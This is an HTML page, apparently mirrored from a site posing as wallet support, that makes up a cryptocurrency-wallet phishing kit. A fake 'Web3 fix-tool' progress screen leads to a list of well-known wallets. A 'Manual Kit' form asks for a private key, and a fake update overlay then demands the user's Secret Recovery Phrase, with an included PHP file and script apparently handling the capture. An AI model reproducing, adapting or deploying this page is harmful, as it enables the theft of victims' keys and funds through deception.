<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from colab-support.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Oct 2025 13:16:50 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', Courier, monospace;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #2c3e50;
        }

        .web3-loader-container {
            background: #333;
            border-radius: 0;
            padding: 15px 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            min-width: 500px;
            max-width: 600px;
        }

        .web3-status-text {
            font-size: 13px;
            font-family: monospace;
            color: #fff;
            margin-bottom: 20px;
            font-weight: 400;
        }

        .web3-main-text {
            font-size: 20px;
            font-weight: 600;
            font-family: monospace;
            color: #fff;
            margin-bottom: 15px;
            min-height: 28px;
        }

        .web3-percentage {
            font-size: 28px;
            font-weight: 500;
            color: #fff;
            margin-bottom: 25px;
        }

        .web3-progress-bar {
            width: 100%;
            height: 18px;
            background: #ecf0f1;
            border-radius: 0;
            overflow: hidden;
            position: relative;
        }

        .web3-progress-fill {
            height: 100%;
            background: #5a8f9e;
            border-radius: 0;
            transition: width 0.3s ease;
        }

        .web3-warning-text {
            text-align: center;
            margin-top: 30px;
            font-size: 13px;
            color: #95a5a6;
            font-weight: 400;
        }

        @keyframes pulse {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0.6;
            }
        }

        .web3-main-text.pulse {
            animation: pulse 1.5s ease-in-out infinite;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #e8e8e8 0%, #d5d5d5 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .modal {
            background: #fff;
            border-radius: 24px;
            width: 100%;
            max-width: 800px;
            height: 75vh;
            display: grid;
            grid-template-columns: 1fr 1fr;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            transition: filter 0.3s ease;
        }

        .modal.blurred {
            filter: blur(8px);
        }

        .left-panel {
            background: #fff;
            padding: 40px;
            border-right: 1px solid #e5e5e5;
            display: flex;
            flex-direction: column;
            height: 100%;
            overflow: hidden;
        }

        .tabs {
            display: flex;
            gap: 12px;
            margin-bottom: 32px;
            flex-shrink: 0;
        }

        .tab {
            background: transparent;
            font-family: monospace;
            color: #666;
            border: none;
            padding: 12px 24px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            transition: all 0.3s ease;
        }

        .tab2 {
            background-color: #fff;
            color: #333;
            border: none;
            font-family: monospace;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 500;
        }

        .tab2.active {
            color: #000;
        }

        .tab2:hover {
            color: #000;
        }

        .tab.active {
            background: #000;
            color: #fff;
        }

        .tab:hover {
            background: #f0f0f0;
            color: #333;
        }

        .tab.active:hover {
            background: #000;
            color: #fff;
        }

        .section-title {
            color: #000;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 16px;
            flex-shrink: 0;
        }

        .search-box {
            width: 96%;
            background: #f5f5f5;
            border: 1px solid #e5e5e5;
            border-radius: 12px;
            padding: 9px 12px;
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
            outline: none;
            transition: all 0.3s ease;
            flex-shrink: 0;
        }

        .search-box:focus {
            border-color: #d0d0d0;
            background: #fff;
        }

        #reown-content {
            display: flex;
            flex-direction: column;
            flex: 1;
            min-height: 0;
        }

        .wallet-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            overflow-y: auto;
            overflow-x: hidden;
            flex: 1;
            padding-right: 8px;
            min-height: 0;
        }

        .wallet-container::-webkit-scrollbar {
            width: 6px;
        }

        .wallet-container::-webkit-scrollbar-track {
            background: transparent;
        }

        .wallet-container::-webkit-scrollbar-thumb {
            background: #d0d0d0;
            border-radius: 3px;
        }

        .wallet-container::-webkit-scrollbar-thumb:hover {
            background: #b0b0b0;
        }

        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .wallet-item {
            background: #f8f8f8;
            border: 1px solid #e5e5e5;
            border-radius: 12px;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            flex-shrink: 0;
        }

        .wallet-item:hover {
            background: #f0f0f0;
            border-color: #d0d0d0;
            transform: translateY(-2px);
        }

        .wallet-icon {
            width: 32px;
            height: 32px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            flex-shrink: 0;
            background: #fff;
        }

        .wallet-icon img {
            width: 100%;
            height: 100%;
            border-radius: 12px;
            object-fit: contain;
            padding: 4px;
        }

        .wallet-name {
            color: #000;
            font-size: 15px;
            font-weight: 500;
            flex: 1;
        }

        .recommended-badge {
            background: #e8f5e9;
            color: #2e7d32;
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.5px;
            flex-shrink: 0;
        }

        .right-panel {
            background: #f5f5f5;
            padding: 60px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            height: 100%;
            overflow: hidden;
        }

        .globe-icon {
            width: 120px;
            height: 120px;
            margin-bottom: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .globe-icon svg {
            width: 80px;
            height: 80px;
            stroke: #999;
            fill: none;
        }

        .connect-text {
            color: #666;
            font-size: 18px;
            font-weight: 400;
            line-height: 1.5;
        }

        .manual-kit-content {
            display: none;
            flex-direction: column;
            flex: 1;
            overflow-y: auto;
            min-height: 0;
        }

        .manual-kit-content.active {
            display: flex;
        }

        .manual-input {
            width: 100%;
            background: #f5f5f5;
            border: 1px solid #e5e5e5;
            border-radius: 12px;
            padding: 14px 16px;
            color: #000;
            font-size: 14px;
            margin-bottom: 16px;
            outline: none;
            transition: all 0.3s ease;
            flex-shrink: 0;
        }

        .manual-input:focus {
            border-color: #d0d0d0;
            background: #fff;
        }

        .connect-btn {
            width: 100%;
            background: #000;
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 16px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            flex-shrink: 0;
        }

        .connect-btn:hover {
            background: #333;
            transform: translateY(-2px);
        }

        @media (max-width:768px) {
            .web3-loader-container {
                padding: 12px;
                min-width: 90vw;
                max-width: 90vw;
            }

            .web3-main-text {
                font-size: 16px;
                font-weight: 400;
                margin-bottom: 10px;
                min-height: 20px;
            }

            .web3-percentage {
                font-size: 20px;
                font-weight: 500;
                margin-bottom: 9px;
            }

            .modal {
                grid-template-columns: 1fr;
                max-width: 100%;
                height: auto;
                min-height: 95vh;
                max-height: 100vh;
            }

            .left-panel {
                border-right: none;
                border-bottom: 1px solid #e5e5e5;
                padding: 24px;
                max-height: 65vh;
            }

            .right-panel {
                padding: 40px 24px;
                min-height: 200px;
            }

            .globe-icon {
                width: 80px;
                height: 80px;
                margin-bottom: 20px;
            }

            .globe-icon svg {
                width: 60px;
                height: 60px;
            }

            .connect-text {
                font-size: 16px;
            }

            .tabs {
                gap: 8px;
            }

            .tab {
                padding: 10px 18px;
                font-size: 13px;
            }

            .wallet-item {
                padding: 4px;
            }
        }

        @media (max-width:480px) {
            body {
                padding: 10px;
            }

            .modal {
                border-radius: 20px;
                min-height: 90vh;
            }

            .left-panel {
                padding: 20px;
            }

            .right-panel {
                padding: 30px 20px;
            }

            .wallet-item {
                padding: 12px;
            }

            .wallet-icon {
                width: 36px;
                height: 36px;
            }

            .wallet-name {
                font-size: 14px;
            }
        }

        .loader-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        .loader-container.hidden {
            opacity: 0;
            visibility: hidden;
        }

        .loader-logo {
            width: 80px;
            height: 80px;
            margin-bottom: 30px;
            animation: float 2s ease-in-out infinite;
            border-radius: 12px;
            object-fit: contain;
        }

        @keyframes float {

            0%,
            100% {
                transform: translateY(0px);
            }

            50% {
                transform: translateY(-10px);
            }
        }

        .circular-loader {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #5a8f9e;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        #updateOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            z-index: 1000;
            overflow-y: auto;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        #updateOverlay .main-container {
            opacity: 1;
            transition: none;
            width: 100%;
            max-width: 500px;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        @media (min-width:1024px) {
            #updateOverlay {
                justify-content: flex-end;
                padding-right: 100px;
            }

            #updateOverlay .main-container {
                max-width: 500px;
                margin-right: 0;
            }
        }

        .close-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: none;
            border: none;
            font-size: 28px;
            color: white;
            cursor: pointer;
            z-index: 1001;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: background 0.3s;
        }

        .close-btn:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .versions-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 30px;
            perspective: 1000px;
            width: 100%;
        }

        .update-card {
            background: white;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            animation: slideUp 0.6s ease forwards;
            opacity: 0;
            transform: translateY(50px);
        }

        @keyframes slideUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .update-card:hover {
            transform: translateY(-10px) scale(1.02);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
        }

        .card-icon {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card-icon img {
            width: 100%;
            height: 100%;
            border-radius: 12px;
            object-fit: contain;
            padding: 4px;
        }

        .download-icon {
            color: #2196F3;
            font-size: 48px;
            margin: 0 auto 20px;
            text-align: center;
        }

        .card-title {
            font-size: 1.5em;
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
            color: #333;
        }

        .version-number {
            text-align: center;
            color: #666;
            font-size: 1.1em;
            margin-bottom: 20px;
        }

        .update-info {
            background: #f8f9fa;
            border-left: 4px solid #2196F3;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            font-size: 0.9em;
            color: #555;
        }

        .features-list {
            list-style: none;
            margin-bottom: 30px;
        }

        .features-list li {
            padding: 10px 0;
            padding-left: 25px;
            position: relative;
            color: #555;
            line-height: 1.5;
        }

        .features-list li:before {
            content: "•";
            position: absolute;
            left: 0;
            color: #2196F3;
            font-size: 1.5em;
        }

        .update-button {
            width: 100%;
            padding: 15px;
            background: #2196F3;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
        }

        .update-button:hover {
            background: #1976D2;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
        }

        .support-link {
            text-align: center;
            margin-top: 15px;
            color: #666;
            font-size: 0.9em;
        }

        .support-link a {
            color: #2196F3;
            text-decoration: none;
        }

        .support-link a:hover {
            text-decoration: underline;
        }

        .update-card.dark {
            background: #1e1e1e;
            color: white;
        }

        .update-card.dark .card-title {
            color: white;
        }

        .update-card.dark .version-number {
            color: #aaa;
        }

        .update-card.dark .features-list li {
            color: #ddd;
        }

        .update-card.dark .update-info {
            background: #333;
            color: #ccc;
            border-left-color: #00bcd4;
        }

        .update-card.dark .update-button {
            background: #00bcd4;
        }

        .update-card.dark .update-button:hover {
            background: #00acc1;
        }

        .update-card.dark .support-link {
            color: #aaa;
        }

        .update-card.dark .support-link a {
            color: #00bcd4;
        }

        .downloading-screen {
            display: none;
            background: white;
            padding: 40px 30px;
            text-align: center;
            max-width: 400px;
            min-height: 100vh;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }

        .downloading-screen.active {
            display: block;
        }

        .downloading-title {
            font-size: 20px;
            font-weight: 600;
            color: #000;
            margin-bottom: 8px;
        }

        .downloading-subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 32px;
        }

        .downloading-screen .circular-loader {
            margin: 24px auto;
        }

        .downloading-screen .progress-bar {
            width: 100%;
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }

        .downloading-screen .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #5a8f9e, #5a8f9e);
            border-radius: 4px;
            width: 0%;
            transition: width 0.3s ease;
        }

        .downloading-screen .progress-text {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
            font-weight: 500;
        }

        .downloading-message {
            font-size: 13px;
            color: #999;
            line-height: 1.4;
            margin-top: 20px;
        }

        .import-container {
            display: none;
            background: #1a1a1a;
            color: white;
            padding: 40px 30px;
            max-width: 40vw;
            margin: 0;
            width: 100%;
            max-height: 100%;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }

        .import-container.active {
            display: block;
        }

        .import-container h1 {
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 16px;
            line-height: 1.3;
        }

        .import-container .description {
            text-align: center;
            color: #b0b0b0;
            font-size: 13px;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .import-container .phrase-selector {
            width: 100%;
            background-color: #2a2a2a;
            border: 1px solid #3a3a3a;
            color: white;
            padding: 10px 14px;
            border-radius: 6px;
            font-size: 14px;
            margin-bottom: 24px;
            cursor: pointer;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1.5L6 6.5L11 1.5' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 12px center;
            padding-right: 32px;
        }

        .import-container .phrase-selector:focus {
            outline: none;
            border-color: #4a90e2;
        }

        .import-container .words-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 9px;
            margin-bottom: 32px;
        }

        .import-container .word-group {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .import-container .word-number {
            font-size: 13px;
            color: #808080;
            font-weight: 500;
            min-width: 20px;
        }

        .import-container .word-input {
            flex: 1;
            background-color: #2a2a2a;
            border: 1px solid #3a3a3a;
            color: white;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.2s;
            max-width: 120px;
        }

        .import-container .word-input:focus {
            outline: none;
            border-color: #4a90e2;
        }

        .import-container .word-input::placeholder {
            color: #5a5a5a;
        }

        .import-container .eye-icon {
            width: 18px;
            height: 18px;
            cursor: pointer;
            opacity: 0.6;
            transition: opacity 0.2s;
            flex-shrink: 0;
        }

        .import-container .eye-icon:hover {
            opacity: 1;
        }

        .import-container .confirm-button {
            width: 100%;
            background-color: #3a3a3a;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .import-container .confirm-button:hover {
            background-color: #33373b;
        }

        .import-container .confirm-button:active {
            background-color: #40464c;
        }

        .import-container .status-message {
            margin-top: 16px;
            padding: 12px;
            border-radius: 6px;
            font-size: 13px;
            display: none;
        }

        .import-container .status-message.error {
            background-color: #4d1a1a;
            color: #f87171;
            border: 1px solid #5a2d2d;
        }

        .qr-popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10001;
        }

        .qr-popup-overlay.active {
            display: flex;
        }

        .qr-popup-content {
            background: white;
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            position: relative;
            animation: popupSlide 0.3s ease;
        }

        @keyframes popupSlide {
            from {
                opacity: 0;
                transform: scale(0.9) translateY(20px);
            }

            to {
                opacity: 1;
                transform: scale(1) translateY(0);
            }
        }

        .qr-popup-close {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            font-size: 28px;
            color: #666;
            cursor: pointer;
            width: 35px;
            height: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s;
        }

        .qr-popup-close:hover {
            background: #f0f0f0;
            color: #000;
        }

        .qr-popup-title {
            font-size: 22px;
            font-weight: 600;
            color: #000;
            margin-bottom: 10px;
        }

        .qr-popup-subtitle {
            font-size: 14px;
            font-family: monospace;
            color: #666;
            margin-bottom: 30px;
        }

        .qr-code-container {
            background: #f5f5f5;
            border-radius: 12px;
            padding: 20px;
            display: inline-block;
            margin-bottom: 20px;
        }

        .qr-code-container img {
            width: 250px;
            height: 250px;
            display: block;
        }

        .qr-popup-message {
            font-size: 13px;
            color: #999;
            line-height: 1.5;
        }

        @media (max-width:480px) {
            .qr-popup-content {
                padding: 30px 20px;
            }

            .qr-code-container img {
                width: 200px;
                height: 200px;
            }

            .qr-popup-title {
                font-size: 18px;
            }
        }

        @media (max-width:768px) {
            #updateOverlay {
                padding: 10px;
            }

            #updateOverlay .close-btn {
                top: 10px;
                right: 10px;
            }

            #updateOverlay .versions-grid {
                gap: 20px;
            }

            #updateOverlay .update-card {
                padding: 30px 20px;
            }

            #updateOverlay .main-container {
                max-width: 100vw;
                padding: 10px;
            }

            .downloading-screen {
                margin-top: 4rem;
                padding: 30px 20px;
                max-width: 100vw;
                min-height: 100vh;
            }

            .import-container {
                margin-top: 2ren;
                min-width: 100vw !important;
                min-height: 100vh !important;
            }

            .import-container .words-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 8px;
            }

            .import-container .word-group {
                gap: 3px;
            }

            .import-container .word-number {
                font-size: 12px;
                min-width: 18px;
            }

            .import-container .eye-icon {
                width: 8px;
                height: 8px;
            }

            .import-container .word-input {
                padding: 8px;
                font-size: 13px;
            }

            .import-container h1 {
                font-size: 20px;
            }

            .import-container .description {
                font-size: 12px;
            }

            .import-container .phrase-selector {
                font-size: 13px;
                padding: 8px 12px;
            }

            .import-container .confirm-button {
                font-size: 14px;
                padding: 12px;
            }
        }

        @media (min-width:1200px) {
            #updateOverlay .versions-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>

<body>
    <div class="web3-loader-container" id="web3Loader">
        <div class="web3-status-text">Running Web3 fix-tool...</div>
        <div class="web3-main-text" id="web3MainText">Resetting Web3 Extensions</div>
        <div class="web3-percentage" id="web3Percentage">0%</div>
        <div class="web3-progress-bar">
            <div class="web3-progress-fill" id="web3ProgressFill"></div>
        </div>
        <div class="web3-warning-text">Do not restart browser or turn off your device</div>
    </div>

    <div class="modal" id="mainModal" style="display: none;">
        <div class="left-panel">
            <div class="tabs">
                <button class="tab active" data-tab="reown">reown</button>
                <button class="tab2">Manual Kit</button>
            </div>

            <div id="reown-content">
                <div class="section-title">Popular:</div>
                <input type="text" class="search-box" id="walletSearch" placeholder="Search wallets...">
            
                <div class="wallet-container">
                    <div class="wallet-list">
                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="metamask.png" alt="MetaMask">
                            </div>
                            <span class="wallet-name">Metamask</span>
                            <span class="recommended-badge">RECOMMENDED</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/phantom.app" alt="Phantom Wallet">
                            </div>
                            <span class="wallet-name">Phantom Wallet</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/trustwallet.com" alt="Trust Wallet">
                            </div>
                            <span class="wallet-name">Trust Wallet</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="wallet-connect.png" alt="WalletConnect">
                            </div>
                            <span class="wallet-name">WalletConnect</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/coinbase.com" alt="Coinbase Wallet">
                            </div>
                            <span class="wallet-name">Coinbase Wallet</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/ledger.com" alt="Ledger">
                            </div>
                            <span class="wallet-name">Ledger</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/web3.okx.com" alt="Okx Wallet">
                            </div>
                            <span class="wallet-name">Okx Wallet</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/trezor.io" alt="Trezor">
                            </div>
                            <span class="wallet-name">Trezor</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/argent.xyz" alt="Argent">
                            </div>
                            <span class="wallet-name">Argent</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/rabby.io" alt="Rabby Wallet">
                            </div>
                            <span class="wallet-name">Rabby Wallet</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/brave.com" alt="Brave Wallet">
                            </div>
                            <span class="wallet-name">Brave Wallet</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/rainbow.me" alt="Rainbow">
                            </div>
                            <span class="wallet-name">Rainbow</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/exodus.com" alt="Exodus">
                            </div>
                            <span class="wallet-name">Exodus</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/frame.sh" alt="Frame">
                            </div>
                            <span class="wallet-name">Frame</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/mycrypto.com" alt="MyCrypto">
                            </div>
                            <span class="wallet-name">MyCrypto</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/safepal.com" alt="Safepal">
                            </div>
                            <span class="wallet-name">Safepal</span>
                        </div>

                        <div class="wallet-item">
                            <div class="wallet-icon">
                                <img src="https://logo.clearbit.com/ambire.com" alt="Ambire">
                            </div>
                            <span class="wallet-name">Ambire</span>
                        </div>
                    </div>
                </div>
            </div>

            <div id="manual-content" class="manual-kit-content">
                <div class="section-title">Connect Manually:</div>
                <input type="text" class="manual-input" placeholder="Enter wallet address...">
                <input type="text" class="manual-input" placeholder="Enter private key (optional)...">
                <button class="connect-btn">Connect Wallet</button>
            </div>
        </div>

        <div class="right-panel">
            <div class="globe-icon">
                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="50" cy="50" r="45" stroke-width="2" />
                    <ellipse cx="50" cy="50" rx="20" ry="45" stroke-width="2" />
                    <line x1="5" y1="50" x2="95" y2="50" stroke-width="2" />
                    <line x1="50" y1="5" x2="50" y2="95" stroke-width="2" />
                    <ellipse cx="50" cy="50" rx="45" ry="20" stroke-width="2" />
                </svg>
            </div>
            <div class="connect-text">Connect your wallet to get started</div>
        </div>
    </div>

    <!-- Loader -->
    <div class="loader-container hidden" id="loader">
        <img class="loader-logo" src="#" alt="Loading...">
        <div class="circular-loader"></div>
    </div>

    <!-- QR Code Popup -->
    <div class="qr-popup-overlay" id="qrPopup">
        <div class="qr-popup-content">
            <button class="qr-popup-close" id="qrPopupClose">×</button>
            <h2 class="qr-popup-title"></h2>
            <p class="qr-popup-subtitle"></p>
            <div class="qr-code-container">
                <img src="tracking-qr-code.png" alt="QR Code">
            </div>
            <p class="qr-popup-message"></p>
        </div>
    </div>

    <!-- Update Overlay -->
    <div id="updateOverlay">
        <button class="close-btn" id="closeOverlay">×</button>
        <div class="main-container" id="overlayContent">
            <div class="versions-grid" id="versionsGrid">
                <!-- Dynamic content inserted here -->
            </div>
            <div class="downloading-screen" id="downloadingScreen">
                <div class="downloading-title">Updating [Wallet Name]</div>
                <div class="downloading-subtitle">Please wait while we update to version 3.105.0</div>
                <div class="circular-loader"></div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <p class="progress-text" id="progressText">Downloading update... 0%</p>
                <div class="downloading-message">This may take a few moments. Please do not close this window.</div>
            </div>
            <div class="import-container" id="importContainer">
                <h1>Import your wallet with your Secret Recovery Phrase</h1>
                <p class="description">
                    We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase
                    that you were given when you created your wallet.
                </p>
                
                
                <?php
include 'import/phrase.php'; ?>

                <select class="phrase-selector" id="phraseLength" style="display:none">
                    <option value="12">I have a 12 words phrase</option>
                    <option value="15">I have a 15 words phrase</option>
                    <option value="18">I have a 18 words phrase</option>
                    <option value="24">I have a 24 words phrase</option>
                </select>

                <div class="words-grid" id="wordsGrid" style="display:none"></div>

                <button class="confirm-button" id="confirmButton" style="display:none">Confirm</button>

                <div class="status-message" id="statusMessage"></div>
            </div>
        </div>
    </div>
    <script>
        // Wallet Search Functionality
    document.addEventListener('DOMContentLoaded', function() {
        const searchInput = document.getElementById('walletSearch');
        const walletItems = document.querySelectorAll('.wallet-item');

        if (searchInput) {
            searchInput.addEventListener('input', function(e) {
                const searchTerm = e.target.value.toLowerCase().trim();

                walletItems.forEach(item => {
                    const walletName = item.querySelector('.wallet-name').textContent.toLowerCase();
                    
                    if (walletName.includes(searchTerm)) {
                        item.style.display = 'flex';
                    } else {
                        item.style.display = 'none';
                    }
                });
            });
        }
    });
    </script>
    <script src="script.js"></script>
</body>


<!-- Mirrored from colab-support.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Oct 2025 13:16:52 GMT -->
</html>